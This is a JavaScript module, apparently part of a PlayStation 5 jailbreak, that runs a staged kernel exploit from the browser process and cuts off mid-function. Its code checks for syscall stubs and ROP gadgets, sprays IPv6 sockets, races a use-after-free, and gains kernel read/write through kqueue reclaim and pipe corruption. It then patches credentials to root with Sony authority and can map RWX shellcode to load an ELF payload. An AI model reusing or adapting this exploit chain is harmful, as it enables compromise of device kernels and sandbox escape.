import {
  K,
  TK,
  w32,
  r32,
  coreList,
} from "./poops-common.js?v=final";
import {
  PSYS,
  PK,
  isKernelPtr,
  isAligned8,
  isZero64,
  hx,
} from "./poops-kernel.js?v=final";

export function buildLadder(X, E) {
  const {
    sys,
    mem,
    flushMark,
    queueEvent,
    note,
    PASS,
    FAIL,
    NA,
    track,
    untrack,
    cfg,
    latch,
    chain,
    runChain,
    P,
    driver,
    state,
    sleep,
    i64,
  } = X;

  function needTrigger(what) {
    if (E.triggered) return null;
    return NA("no trigger armed, no triplet to " + what);
  }

  const TW = E.TW;
  const H = E.H;
  const L = [];

  function need(what, cond) {
    return cond
      ? null
      : FAIL(
          "needs " +
            what +
            ", which did not run " +
            "(skipped by ?only= or ?from=)",
        );
  }

  L.push({
    key: "ps0_preflight",
    label: "preflight: stubs, gadgets, core, measured cost",
    cls: "measurement",
    hot: true,
    async run() {
      const wanted = [
        [PSYS.GETPID, "round-trip calibration"],
        [PSYS.READ, "iov/uio drain"],
        [PSYS.WRITE, "iov/uio feed"],
        [PSYS.CLOSE, "every free"],
        [PSYS.RECVMSG, "four iov racers block in it"],
        [PSYS.SOCKET, "IPv6 spray bank"],
        [PSYS.SETSOCKOPT, "set_rthdr / free_rthdr"],
        [PSYS.GETSOCKOPT, "get_rthdr, the only read handle"],
        [PSYS.READV, "uio write racers"],
        [PSYS.WRITEV, "uio read racers"],
        [PSYS.SOCKETPAIR, "iov_ss and uio_ss"],
        [PSYS.KQUEUE, "stage 1 reclaim"],
        [PSYS.NANOSLEEP, "every settle"],
        [PSYS.SCHED_YIELD, "the race is yield-ordered"],

        [PSYS.THR_NEW, "twelve racers"],
        [PSYS.THR_EXIT, "kill switch tail"],
        [PSYS.READ, "racers park in read() on their wake gate"],
        [
          PSYS.PIPE2,
          "master/victim pipes and twelve racer wake " +
            "gates; 0x2A is banned",
        ],
        [PSYS.RTPRIO_THREAD, "PRI_REALTIME/256"],
        [PSYS.CPUSET_GETAFFINITY, "inherited mask"],
        [PSYS.CPUSET_SETAFFINITY, "the pin"],
      ];
      const missing = [];
      for (const [num, why] of wanted)
        if (P.syscalls[num] === undefined)
          missing.push(
            "0x" + num.toString(16).toUpperCase() + " (" + why + ")",
          );

      if (cfg.trigger === "netcontrol") {
        for (const [num, why] of [
          [PSYS.NETCONTROL, "SET/CLEAR_QUEUE"],
          [PSYS.SETUID, "fresh cred"],
          [PSYS.DUP, "close(dup(uaf))"],
        ])
          if (P.syscalls[num] === undefined)
            missing.push(
              "0x" + num.toString(16).toUpperCase() + " (" + why + ")",
            );
      }
      if (cfg.trigger === "overflow") {
        for (const [num, why] of [
          [PSYS.KQUEUEEX, "cr_ref burn"],
          [PSYS.OPEN, "free-fd pool"],
          [PSYS.SETUID, "fresh cred"],
          [PSYS.GETRLIMIT, "raise NOFILE"],
          [PSYS.SETRLIMIT, "raise NOFILE"],
        ])
          if (P.syscalls[num] === undefined)
            missing.push(
              "0x" + num.toString(16).toUpperCase() + " (" + why + ")",
            );
      }
      if (missing.length)
        return FAIL(
          "missing syscall stubs in the active firmware profile: "
            + missing.join(", "),
        );
      note("all stage 0-2 syscall stubs present in the active firmware profile ("
        + Object.keys(P.syscalls).length + " entries)");

      const gadgets = [
        "pop rdi",
        "pop rsi",
        "pop rdx",
        "pop rcx",
        "pop r8",
        "pop r9",
        "pop rax",
        "pop rsp",
        "ret",
        "mov [rdi], rax",
        "mov [rdi], eax",
        "mov [rdi], rsi",
        "mov rax, [rax]",
        "inc dword [rax]",
      ];

      if (cfg.trigger === "overflow")
        gadgets.push("cmp [rcx], eax", "sete al", "shl rax, 3", "add rax, rcx");
      const badG = gadgets.filter((g) => P.gadgets[g] === undefined);
      if (badG.length) return FAIL("missing gadgets: " + badG.join(", "));

      const word = driver.origMaskBytes ? r32(driver.origMaskBytes, 0) : 0;
      if (!word) return FAIL("inherited affinity mask is 0, no core to pin to");
      if (((word >>> driver.core) & 1) === 0)
        return FAIL(
          "chosen core " +
            driver.core +
            " is not in the " +
            "inherited mask 0x" +
            word.toString(16),
        );
      note(
        "inherited mask 0x" +
          word.toString(16) +
          " = cores " +
          coreList(word) +
          "; driver core " +
          driver.core +
          " -- " +
          driver.coreWhy,
      );
      note("poops.c:52 hardcodes MAIN_CORE 5 and p2jb.js:193 uses 4");

      const REPS = 12;
      for (let w = 0; w < 4; ++w) {
        chain.fcall(P.syscalls[PSYS.GETPID]);
        chain.write_result4(chain.return_value);
        await runChain();
      }
      let empty = 0;
      for (let r = 0; r < REPS; ++r) {
        const t0 = Date.now();
        await runChain();
        empty += Date.now() - t0;
      }
      const a = empty / REPS;
      let loaded = 0;
      for (let r = 0; r < REPS; ++r) {
        for (let i = 0; i < 32; ++i) {
          chain.fcall(P.syscalls[PSYS.GETPID]);
          chain.write_result4(chain.return_value);
        }
        const t0 = Date.now();
        await runChain();
        loaded += Date.now() - t0;
      }
      const b = (loaded / REPS - a) / 32;
      X.measured.rt = { a, b };
      note(
        "measured: chain.run() = " +
          a.toFixed(2) +
          " ms fixed + " +
          (b * 1000).toFixed(1) +
          " us per in-chain syscall",
      );

      const n = cfg.sockets;

      const perRoundSys = PK.IOV_THREAD_NUM + 3;
      const perAttemptSys =
        n +
        1 +
        PK.IOV_FLUSH_ROUNDS * perRoundSys +
        1 +
        PK.MAX_ROUNDS_TWIN * 2 * n;

      const perAttemptRt = 1 + PK.IOV_FLUSH_ROUNDS * 2 + 1 + PK.MAX_ROUNDS_TWIN;
      const perAttemptMs =
        perAttemptRt * a + perAttemptSys * b + PK.ATTEMPT_GAP_MS;
      const outer = cfg.attempts;
      X.measured.attemptCost = { perAttemptSys, perAttemptRt, perAttemptMs };

      note(
        "floor (chain cost only, no rendezvous or sleep latency): ~" +
          perAttemptSys +
          " syscalls in ~" +
          perAttemptRt +
          " round trips = ~" +
          perAttemptMs.toFixed(0) +
          " ms per failing stage-0 attempt",
      );

      const readMs = 9 * a + 190 * b;

      const RT_PER_BATCH = 3;
      const stage1Batches = PK.KQ_ROUNDS / PK.KQ_BATCH;
      const stage1Ms = stage1Batches * (RT_PER_BATCH * a + 2 * PK.KQ_BATCH * b);
      const stage2Ms = 7 * PK.KSLOW_ATTEMPTS * readMs + 2100;
      X.measured.stageCost = { readMs, stage1Ms, stage2Ms };
      note(
        "kread_slow ~" +
          readMs.toFixed(0) +
          " ms; 186 round trips ~" +
          (186 * a).toFixed(0) +
          " ms",
      );
      note(
        "stage 1 worst case (" +
          PK.KQ_ROUNDS +
          " rounds at batch " +
          PK.KQ_BATCH +
          " = " +
          stage1Batches +
          " batches x " +
          RT_PER_BATCH +
          " round trips): ~" +
          (stage1Ms / 1000).toFixed(1) +
          " s, bounded by " +
          (cfg.stage1DeadlineMs / 1000).toFixed(0) +
          " s of wall clock. " +
          "stage 2 (7 reads x up to " +
          PK.KSLOW_ATTEMPTS +
          " tries, " +
          "plus 2100 ms of nanosleep): ~" +
          (stage2Ms / 1000).toFixed(1) +
          " s.",
      );
      note(
        "stage 1 deadline " + (cfg.stage1DeadlineMs / 1000).toFixed(0) + " s",
      );

      note(
        "KQ_FDP 0xA8, FILEDESC_OFILES 0x00, FDESCENTTBL_HDR 0x08, " +
          "FILEDESCENT_SIZE 0x30",
      );
      note("kqueue magic 0x1430000 at chunk+0x08");

      if (cfg.netprobe) {
        note(
          "?netprobe=1: netcontrol(-1, SET_QUEUE, buf, 8) on a live " +
            "fd, then CLEAR_QUEUE on the same fd",
        );
        const b8 = E.alloc(8, "netprobe-buf");
        const s = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
        if (s.failed) {
          note("netprobe: could not create the probe socket");
        } else {
          track(s.s32);
          w32(b8.u8, 0, s.s32);
          flushMark("NETPROBE-SET-PRE", "fd=" + s.s32 + "-slot=-1");
          const r1 = await sys(
            PSYS.NETCONTROL,
            i64(0xffffffff, 0xffffffff),
            PK.NET_CONTROL_NETEVENT_SET_QUEUE,
            b8.base,
            8,
          );
          note(
            "netcontrol(-1, SET_QUEUE) -> " + r1.s32 + " (" + r1.errText + ")",
          );
          if (!r1.failed && r1.s32 === 0) {
            const r2 = await sys(
              PSYS.NETCONTROL,
              0,
              PK.NET_CONTROL_NETEVENT_CLEAR_QUEUE,
              b8.base,
              8,
            );
            note(
              "netcontrol(0, CLEAR_QUEUE, same live fd) -> " +
                r2.s32 +
                " (" +
                r2.errText +
                ")",
            );
            note("reachable");
          } else {
            note("not reachable from the WebProcess sandbox with slot -1");
          }
          await sys(PSYS.CLOSE, s.s32);
          untrack(s.s32);
        }
      } else {
        note("?netprobe=1 not set, netcontrol not called");
      }

      if (cfg.trigger === "none") note("trigger: none");
      else if (cfg.trigger === "netcontrol")
        note(
          "trigger: netcontrol -- " +
            "SET_QUEUE/CLEAR_QUEUE around " +
            "an fd-number reuse, then close(dup(uaf_socket)) as each " +
            "crfree. outer loop " +
            PK.NETCTRL_ATTEMPTS,
        );
      else
        note(
          "trigger: overflow -- " +
            "probes the fd budget, setuid(1) (irreversible), " +
            "burns kqueueex references to wrap cr_ref, builds a " +
            "pool of up to " +
            PK.FREE_FDS_CAP +
            " fds whose close() " +
            "is the crfree. attempts " +
            PK.TRIPLEFREE_ATTEMPTS +
            ". burn=" +
            cfg.burn +
            ".",
        );
      if (cfg.trigger === "overflow")
        note(
          "R_ESTIMATE = 83 (p2jb.js:1058) is the netflix app's " +
            "fd/thread count, not ours",
        );

      return PASS(
        "stubs and gadgets complete; core " +
          driver.core +
          " from the inherited mask 0x" +
          word.toString(16) +
          "; chain.run() = " +
          a.toFixed(2) +
          " ms + " +
          (b * 1000).toFixed(1) +
          " us/syscall; one failing stage-0 " +
          "attempt ~" +
          perAttemptMs.toFixed(0) +
          " ms, " +
          outer +
          " of them ~" +
          ((perAttemptMs * outer) / 1000).toFixed(1) +
          " s; one kread_slow ~" +
          readMs.toFixed(0) +
          " ms",
      );
    },
  });

  L.push({
    key: "ps1_prepare",
    label: "prepare_fds -- every resource stage 0 needs",
    cls: "state",
    async run() {
      const wasRace = X.setRaceMode(true);
      try {
        const lr = await latch.set(
          "ps1: opening " +
            cfg.sockets +
            " ipv6 sockets, 2 socketpairs, 2 pipes and 12 racer threads " +
            "in this WebProcess; trigger=" +
            cfg.trigger,
        );
        if (!lr.set)
          return FAIL(
            "one-shot latch did not take (" +
              (lr.detail || "?") +
              "); nothing has been changed yet",
          );

        const pr = await H.writeRtprio(
          TK.PRI_REALTIME,
          TK.POOPS_RTPRIO,
          "driver",
        );
        driver.prioChanged = true;
        if (pr.failed)
          return FAIL(
            "rtprio_thread(RTP_SET, realtime/256) on " +
              "the driver failed: " +
              pr.errText,
          );
        const pb = await H.readRtprio("driver-check");
        if (pb.type !== TK.PRI_REALTIME || pb.prio !== TK.POOPS_RTPRIO)
          return FAIL("driver rtprio read back " + pb.type + "/" + pb.prio);
        const pin = await H.pinDriver(driver.core);
        driver.affChanged = true;
        if (pin.failed)
          return FAIL(
            "pinning the driver to core " +
              driver.core +
              " failed: " +
              pin.errText,
          );
        const back = await H.readAffinity("driver-pin-check");
        if (r32(back.bytes, 0) !== (1 << driver.core) >>> 0)
          return FAIL(
            "driver affinity read back 0x" +
              r32(back.bytes, 0).toString(16) +
              ", not 0x" +
              ((1 << driver.core) >>> 0).toString(16),
          );
        driver.pinned = true;
        note(
          "driver: PRI_REALTIME/256 set and read back, pinned to core " +
            driver.core +
            " and read back",
        );

        E.buildBuffers();
        note(
          "recvmsg iovec array is " +
            PK.MSG_IOV_NUM +
            " x " +
            PK.IOV_SIZE +
            " = " +
            PK.MSG_IOV_NUM * PK.IOV_SIZE +
            " bytes with iov[0] = {base:1, len:1}",
        );
        note(
          "uio geometry: sizeof(struct uio) 0x30 + UIO_IOV_COUNT(" +
            PK.UIO_IOV_COUNT +
            ") x 0x10 = 0x170 == MSG_IOV_NUM(" +
            PK.MSG_IOV_NUM +
            ") x 0x10 = 0x170; 0x168 shares that bucket",
        );

        const [ia, ib] = await E.socketpairUnix("iov");
        const [ua, ub] = await E.socketpairUnix("uio");
        E.setSocketpairs(ia, ib, ua, ub);
        const [mr, mw] = await E.pipe2Nonblock("master");
        const [vr, vw] = await E.pipe2Nonblock("victim");
        E.setPipes(mr, mw, vr, vw);
        note(
          "master pipe r=" +
            mr +
            " w=" +
            mw +
            ", victim pipe r=" +
            vr +
            " w=" +
            vw,
        );

        await E.setupRacerGroups(driver.core);
        const sp = await E.spawnRacers(driver.core);
        note(
          "racers: " +
            sp
              .map((s) => s.name + "=" + s.live + " in " + s.ms + " ms")
              .join(", ") +
            " -- all pinned to core " +
            driver.core +
            " at PRI_REALTIME/" +
            TK.POOPS_RTPRIO +
            ", " +
            "pinret/affret/prioret/lookupret and sceKernelGetCurrentCpu " +
            "read back",
        );

        const so = await TW.openSockets(cfg.sockets);
        if (so.opened < 4)
          return FAIL("only " + so.opened + " IPv6 sockets: " + so.stoppedAt);
        if (so.opened < cfg.sockets)
          note(
            "opened " +
              so.opened +
              "/" +
              cfg.sockets +
              " (" +
              so.stoppedAt +
              ")",
          );
        TW.buildSprayBank(TW.S.n);
        const shape = TW.measureShape(TW.S.n);
        X.measured.shape = shape;
        note(
          "spray bank: " +
            TW.S.n +
            " pre-tagged 360-byte headers, one " +
            "per socket; " +
            shape.calls +
            " syscalls = " +
            shape.perAttempt +
            " chain slots; usable " +
            "region " +
            shape.capacity +
            " slots.",
        );

        await E.sleepK(PK.SETTLE_AFTER_BANK_MS);

        if (TW.S.dupCount)
          return FAIL(
            "socket bank holds " +
              TW.S.dupCount +
              " duplicate descriptor(s): " +
              TW.S.n +
              " slots, " +
              (TW.S.n - TW.S.dupCount) +
              " distinct fds",
          );

        await TW.runTwinBatch(1, TW.S.n, 0, null);
        const probes = [0, Math.floor(TW.S.n / 2), TW.S.n - 1];
        const bad = [];
        for (const idx of probes) {
          const fh = await TW.readFullHeader(idx);
          if (fh.failed) {
            bad.push(idx + "=err");
            continue;
          }
          if (fh.outLen !== PK.UCRED_SIZE) bad.push(idx + "=len" + fh.outLen);
          else if (!fh.tagOk) bad.push(idx + "=tag0x" + fh.tag.toString(16));
        }
        if (bad.length)
          return FAIL("bank is not in the 0x168 size class: " + bad.join(","));
        note(
          "size class proven on sockets " +
            probes.join(",") +
            ": getsockopt copied out exactly 0x" +
            PK.UCRED_SIZE.toString(16) +
            " bytes with the right tag at +0x04.",
        );

        let pf = null;
        if (cfg.trigger === "overflow") {
          pf = await E.prepareFds({
            mode: cfg.burn,
            core: driver.core,
            probeRounds: cfg.burnRounds,
            unroll: cfg.burnUnroll,
          });
          note(
            "prepare_fds(" +
              cfg.burn +
              "): fd_budget=" +
              pf.fdBudget +
              ", free_fds_num=" +
              pf.freeFdsNum +
              ", kqueueex(0x800000000000) returned " +
              pf.kqueueexRet +
              ", " +
              pf.burnSyscalls +
              " burn calls in " +
              pf.burnMs +
              " ms, fd delta " +
              pf.fdDelta +
              ". " +
              (pf.why || ""),
          );
          if (pf.fdDelta > 0)
            note(
              "kqueueex consumed " +
                pf.fdDelta +
                " descriptor(s) " +
                "across the burn",
            );
          if (!pf.ok) return FAIL("prepare_fds: " + pf.why);
          if (pf.plannedRounds !== undefined && cfg.burn === "full")
            note(
              "burn budget: " +
                pf.leaked +
                " references leaked (" +
                pf.burnRounds +
                " rounds x " +
                PK.LEAK_UNROLL +
                " unrolled, per-worker queue " +
                (pf.queued || []).join("/") +
                ", plus a " +
                pf.tailIssued +
                "-call tail from the " +
                "driver's own chain) plus " +
                pf.freeFdsNum +
                " pool " +
                "crholds = 0x100000001, cr_ref = R+1",
            );
          if (cfg.burn !== "full")
            note(
              "burn not run (burn=" +
                cfg.burn +
                "), cr_ref has not " +
                "wrapped and no free-fd pool exists",
            );
        }

        X.measured.prepare = { sockets: TW.S.n, racers: sp, prepareFds: pf };
        return PASS(
          TW.S.n +
            " IPv6 sockets in the 0x168 class, 12 racers on " +
            "core " +
            driver.core +
            " at RT/256 with every prologue read " +
            "back, 2 socketpairs, 2 pipes (master r=" +
            mr +
            " victim r=" +
            vr +
            "), " +
            shape.perAttempt +
            " slots per attempt" +
            (pf ? "; prepare_fds " + cfg.burn + " ok" : ""),
        );
      } finally {
        X.setRaceMode(wasRace);
      }
    },
  });

  L.push({
    key: "ps2_one_attempt",
    label: "one attempt_race, instrumented to the step",
    cls: cfg.trigger === "none" ? "negative control" : "BUG",
    hot: true,
    async run() {
      const pre = need("ps1_prepare", TW.S.n > 0 && E.S.buf);
      if (pre) return pre;

      if (cfg.trigger !== "none")
        return NA(
          "trigger=" +
            cfg.trigger +
            " is armed, ps3 owns " +
            "the…2895 tokens truncated…    );
        return PASS(
          "negative control: " +
            r.attempts +
            " attempt(s), " +
            r.ms +
            " ms, no twin and no triplet. " +
            (r.ms / Math.max(1, r.attempts)).toFixed(0) +
            " ms per attempt",
        );
      }
      if (r.ok)
        return PASS(
          "stage 0 ok on attempt " +
            r.attempts +
            "/" +
            cfg.attempts +
            " in " +
            r.ms +
            " ms, triplets " +
            TW.S.triplets.join(",") +
            " (fds " +
            TW.S.triplets.map((i) => TW.S.fds[i]).join(",") +
            "). reboot when done",
        );
      return FAIL(
        "stage 0 failed after " +
          r.attempts +
          " attempts (" +
          r.ms +
          " ms): " +
          (r.why || "?") +
          (E.triggered
            ? ". trigger fired but no alias found; reboot"
            : ". nothing was freed"),
      );
    },
  });

  L.push({
    key: "ps4_validate",
    label: "validate the triplet independently of the scan",
    cls: "evidence",
    async run() {
      const na = needTrigger("validate");
      if (na) return na;
      if (!TW.tripletsValid())
        return FAIL(
          "no valid triplet to validate (triplets=" +
            TW.S.triplets.join(",") +
            ") but the trigger fired",
        );
      const [t0, t1, t2] = TW.S.triplets;
      if (t0 === t1 || t0 === t2 || t1 === t2)
        return FAIL("triplet members are not pairwise distinct");

      const sizes = [];
      const tags = [];
      for (const idx of [t0, t1, t2]) {
        const fh = await TW.readFullHeader(idx);
        if (fh.failed)
          return FAIL("readFullHeader(" + idx + ") failed: " + fh.errText);
        sizes.push(idx + ":len=" + fh.outLen + ",tag=0x" + fh.tag.toString(16));
        tags.push(fh.tag >>> 0);
        if (fh.outLen !== PK.UCRED_SIZE)
          return FAIL(
            "socket " +
              idx +
              " reads back " +
              fh.outLen +
              " bytes, not 0x" +
              PK.UCRED_SIZE.toString(16) +
              ", chunk left the ucred size class",
          );
      }
      note("size class holds on all three: " + sizes.join("  "));

      if (!(tags[0] === tags[1] && tags[1] === tags[2]))
        return FAIL(
          "the three members disagree on +0x04: " +
            sizes.join("  ") +
            "; " +
            tags.length +
            " different tags, " +
            "alias not reproducible",
        );
      const owner = tags[0] & 0xffff;
      return PASS(
        "sockets " +
          t0 +
          ", " +
          t1 +
          " and " +
          t2 +
          " each copy out 0x" +
          PK.UCRED_SIZE.toString(16) +
          " bytes and all read tag 0x" +
          tags[0].toString(16) +
          ", written by socket " +
          owner +
          ". read-only check",
      );
    },
  });

  L.push({
    key: "ps5_stage1",
    label: "stage 1 -- kqueue reclaim, proc_filedesc, triplet repair",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("read through");
      if (na) return na;
      if (!TW.tripletsValid())
        return FAIL(
          "stage 1 needs three live aliases; triplets=" +
            TW.S.triplets.join(","),
        );
      const r = await E.stage1({
        kqBatch: cfg.kqBatch,
        rounds: cfg.kqRounds,
        deadlineMs: cfg.stage1DeadlineMs,
        repairDeadlineMs: cfg.repairDeadlineMs,
        confirm: cfg.kqConfirm,
      });
      note(
        "kqueue rounds " +
          r.rounds +
          ", opened " +
          r.kqOpened +
          ", closed " +
          r.kqClosed +
          ", hits " +
          r.hits.length +
          ", copyout lengths seen " +
          r.outLens.join(","),
      );
      if (r.hits.length)
        note(
          "signature: the 32-bit form (0x" +
            PK.KQ_SIGNATURE.toString(16) +
            ", poops_ps5.lua:737) held; " +
            "the 64-bit form (poops.c:793) " +
            (r.sig64 ? "also held" : "did not hold"),
        );
      if (!r.ok) return FAIL("stage 1: " + r.why);

      if (r.independent)
        note(
          "two independent kqueues report the same kq_fdp, " +
            "batches " +
            r.batches.join(" and ") +
            " agree",
        );
      else
        note(
          "only one kqueue landed (batch " +
            r.batches.join(",") +
            (r.confirmGaveUp
              ? "; the confirm search spent its " + "extra-round budget"
              : "") +
            "), proc_filedesc on range checks alone",
        );
      note(
        "readback cells re-zeroed, optlen 256, counted at 0x" +
          PK.KQ_MIN_OUTLEN.toString(16) +
          " bytes",
      );

      const k1 = await E.kslow64(
        E.S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
        "ps5:fd_files#1",
        { repairDeadlineMs: cfg.repairDeadlineMs },
      );
      if (!k1.ok)
        return FAIL(
          "proc_filedesc " +
            hx(r.fdp) +
            " passes, but " +
            "kread_slow could not read fdp->fd_files: " +
            k1.log.join(" | "),
        );
      const k2 = await E.kslow64(
        E.S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
        "ps5:fd_files#2",
        { repairDeadlineMs: cfg.repairDeadlineMs },
      );
      if (!k2.ok)
        return FAIL(
          "the second read of fdp->fd_files failed: " + k2.log.join(" | "),
        );
      if (k1.value.low !== k2.value.low || k1.value.hi !== k2.value.hi)
        return FAIL(
          "kread_slow not repeatable: fdp->fd_files read " +
            hx(k1.value) +
            " then " +
            hx(k2.value) +
            ", one of the two is fabricated",
        );
      note("fd_files read twice, " + hx(k1.value) + " both times");
      note(
        "leaked_iov (chunk kva + 0x30) is " +
          hx(E.S.leakedIovFirst) +
          ", asserted byte-identical on " +
          "every later kread_slow",
      );

      return PASS(
        "proc_filedesc = " +
          hx(r.fdp) +
          " from a " +
          r.winnerOutLen +
          " byte copyout" +
          (r.independent
            ? ", confirmed by two kqueues (" + r.batches.join(",") + ")"
            : ", single kqueue, not cross-checked") +
          ", triplets " +
          TW.S.triplets.join(",") +
          ", fd_files = " +
          hx(k1.value),
      );
    },
  });

  L.push({
    key: "ps6_stage2",
    label: "stage 2 -- the fd-table walk to two struct pipe pointers",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("leak through");
      if (na) return na;
      if (!E.S.procFiledesc) return FAIL("stage 2 needs proc_filedesc");
      if (!TW.tripletsValid())
        return FAIL(
          "stage 2 needs three live aliases; triplets=" +
            TW.S.triplets.join(","),
        );
      const r = await E.stage2({
        attempts: cfg.stage2Attempts,
        repairDeadlineMs: cfg.repairDeadlineMs,
        deadlineMs: cfg.stage2DeadlineMs,
      });
      for (const s of r.steps) note(s);
      if (!r.ok)
        return FAIL(
          "stage 2 (attempt " +
            r.attempt +
            " of " +
            cfg.stage2Attempts +
            "): " +
            r.why,
        );

      const vals = [
        ["fd_ofiles", E.S.fdOfiles],
        ["master_fp", E.S.masterFp],
        ["victim_fp", E.S.victimFp],
        ["master_pipe", E.S.masterPipeData],
        ["victim_pipe", E.S.victimPipeData],
      ];
      for (const [nm, v] of vals) {
        if (!isKernelPtr(v))
          return FAIL(nm + " = " + hx(v) + " is not canonical");
        if (!isAligned8(v))
          return FAIL(nm + " = " + hx(v) + " is not 8-aligned");
        if (isZero64(v)) return FAIL(nm + " is zero");
      }
      note(
        "all five pointers canonical kernel VAs (>>48 == 0xFFFF) " +
          "and 8-aligned",
      );
      if (E.S.nfiles > 0)
        note(
          "fdt_nfiles = " +
            E.S.nfiles +
            " and both fds (" +
            E.S.masterRfd +
            ", " +
            E.S.victimRfd +
            ") are inside it",
        );
      note("master_fp != victim_fp AND master_pipe != victim_pipe");
      if (r.recheckOk)
        note(
          "S2.7: fdescenttbl re-read at the end of the walk, " +
            "matches the value the walk started from",
        );
      else
        note(
          "S2.7 did not run: fdescenttbl re-read failed, single " +
            "unrepeated read of the fd table base",
        );
      note("the two pipe pointers are retained in-process as Stage 3 input");

      return PASS(
        "fd_ofiles = " +
          hx(E.S.fdOfiles) +
          ", master_fp = " +
          hx(E.S.masterFp) +
          ", victim_fp = " +
          hx(E.S.victimFp) +
          ", master_pipe = " +
          hx(E.S.masterPipeData) +
          ", victim_pipe = " +
          hx(E.S.victimPipeData) +
          " (" +
          E.S.kreadOk +
          "/" +
          E.S.kreadCalls +
          " kread_slow)",
      );
    },
  });

  L.push({
    key: "ps8_stage3",
    label: "stage 3 -- pipe corruption, kernel R/W, self-test, repair",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("write through");
      if (na) return na;
      if (!E.S.masterPipeData || !E.S.victimPipeData)
        return FAIL(
          "stage 3 needs stage 2's two struct pipe pointers " +
            "(master=" +
            hx(E.S.masterPipeData) +
            " victim=" +
            hx(E.S.victimPipeData) +
            ")",
        );

      const r = await E.stage3({
        loopDeadlineMs: cfg.kreadLoopDeadlineMs || 30000,
        repairDeadlineMs: cfg.repairDeadlineMs || 20000,
      });
      for (const st of r.steps) note(st);

      if (!r.ok) return FAIL("stage 3: " + r.why);

      const rt = r.readTest,
        wt = r.writeTest;
      const pid =
        rt.pid && !rt.pid.skipped
          ? "read test B (pid): curproc=" +
            rt.pid.curproc +
            ", curproc->p_pid reads " +
            rt.pid.kernelPid +
            " and getpid() independently says " +
            rt.pid.userlandPid +
            ", reached through kernel memory. "
          : "read test B (pid) skipped (" +
            (rt.pid ? rt.pid.skipped : "?") +
            "); test A alone carries the verdict. ";
      return PASS(
        "kernel r/w ok. cross-read at " +
          rt.cross.addr +
          ": fast " +
          rt.cross.fast +
          ", slow " +
          rt.cross.slow +
          ". " +
          pid +
          "write: f_count fd " +
          wt.fd +
          " " +
          wt.before +
          " -> " +
          wt.after +
          ". cleanup: " +
          r.cleanup.rthdrCleared +
          "/3 rthdr cleared, " +
          r.cleanup.uafRemoved +
          " uaf slot(s), " +
          E.S.kernelWrites +
          " kernel writes",
      );
    },
  });

  L.push({
    key: "ps9_stage4",
    label: "stage 4 -- sandbox escape, root, Sony authority",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("patch credentials through");
      if (na) return na;
      if (!E.S.aliasesRepaired)
        return FAIL(
          "stage 4 needs stage 3's repair certified " +
            "first; three sockets still alias " +
            "one freed chunk",
        );

      const r = await E.stage4({});
      for (const st of r.steps) note(st);
      if (!r.ok) return FAIL("stage 4: " + r.why);

      return PASS(
        "uid " +
          r.before.uid +
          " -> " +
          r.after.uid +
          ", getuid()=" +
          r.after.getuid +
          ", rdir/jdir " +
          r.after.rdir +
          ", authid " +
          r.after.authid +
          (r.authOk ? "" : " (not the value written)") +
          ", " +
          E.S.kernelWrites +
          " kernel writes",
      );
    },
  });

  L.push({
    key: "ps10_stage5", label: "stage 5 -- load elfldr + run the kexp shellcode",
    cls: "PAYLOAD", hot: true,
    async run() {
      const mode = String(cfg.payload || "");
      if (mode !== "1" && mode !== "dry") return NA("stage 5 runs a payload, opt-in only");
      if (!E.S.jailbroken) return FAIL("stage 5 needs stage 4's jailbreak (getuid()==0); " +
        "jitshm_create and an RWX mmap need it",);
      const r = await E.stage5({ dryRun: mode === "dry" });
      for (const st of r.steps) note(st);
      if (!r.ok) return FAIL("stage 5: " + r.why);
      if (!r.ran) return PASS("dry run: blobs staged, allproc found, shellcode " +
        "mapped RWX, pthread entries located, argument block " + "built",);
      return PASS("payload ran, shellcode returned " + r.shellRet +
        ". args: pipe fds, allproc, elfldr blob",);
    },
  });
  L.push({
    key: "ps7_report",
    label: "state report, cleanup, and the reboot verdict",
    cls: "cleanup",
    async run() {
      if (E.kernelWrites !== 0 && !E.S.aliasesRepaired)
        return FAIL(
          "kernelWrites is " +
            E.kernelWrites +
            " but stage 3 did not certify the repair " +
            "(aliasesRepaired=false)",
        );
      if (E.kernelWrites !== 0) note("kernel writes " + E.kernelWrites);

      const rep = await E.cleanup({
        teardown: {
          skipIndices:
            TW.tripletsValid() && !E.S.aliasesRepaired
              ? TW.S.triplets.slice()
              : [],
        },
      });
      for (const g of rep.groups) note("racers: " + g);
      if (rep.socketpairs) note("socketpairs: " + rep.socketpairs);
      if (rep.teardown) {
        if (rep.teardown.refused)
          note(
            "bank teardown refused: " +
              rep.teardown.reason +
              " -- " +
              rep.teardown.leftOpen +
              " sockets left open " +
              "on purpose",
          );
        else
          note(
            "bank: freed " +
              rep.teardown.freed +
              "/" +
              rep.teardown.total +
              ", closed " +
              rep.teardown.closed +
              "/" +
              rep.teardown.total +
              (rep.teardown.skipped && rep.teardown.skipped.length
                ? ", exempt " + rep.teardown.skipped.join(",")
                : ""),
          );
      }
      if (rep.kqClosed) note("kqueues closed at cleanup: " + rep.kqClosed);
      if (rep.pipesClosed) note("pipes closed: " + rep.pipesClosed);
      if (rep.poolClosed) note("free-fd pool tail closed: " + rep.poolClosed);
      for (const nn of rep.notes) note(nn);
      if (rep.uafLeft) note("uaf_socket: " + rep.uafLeft);
      if (rep.restore)
        note(
          "scheduler restored: affinity " +
            (rep.restore.affOk
              ? "OK"
              : "FAILED (saw " + rep.restore.affSeen + ")") +
            ", priority " +
            (rep.restore.prioOk
              ? "OK"
              : "FAILED (saw " + rep.restore.prioSeen + ")"),
        );

      const v = E.verdict({
        teardownRan: !!(rep.teardown && !rep.teardown.refused),
        teardownRefused: !!(rep.teardown && rep.teardown.refused),
        teardownIncomplete: !!(
          rep.teardown &&
          !rep.teardown.refused &&
          (rep.teardown.freeFailed || []).length +
            (rep.teardown.closeFailed || []).length >
            0
        ),
        chainDead: X.chainDeadNow ? X.chainDeadNow() : false,
        restoreMissing: !!rep.restoreNeeded && !rep.restore,
        affRestoreFailed: !!(
          rep.restoreNeeded &&
          rep.restore &&
          !rep.restore.affOk
        ),
        prioRestoreFailed: !!(
          rep.restoreNeeded &&
          rep.restore &&
          !rep.restore.prioOk
        ),
        affRestored: rep.restore ? !!rep.restore.affOk : !rep.restoreNeeded,
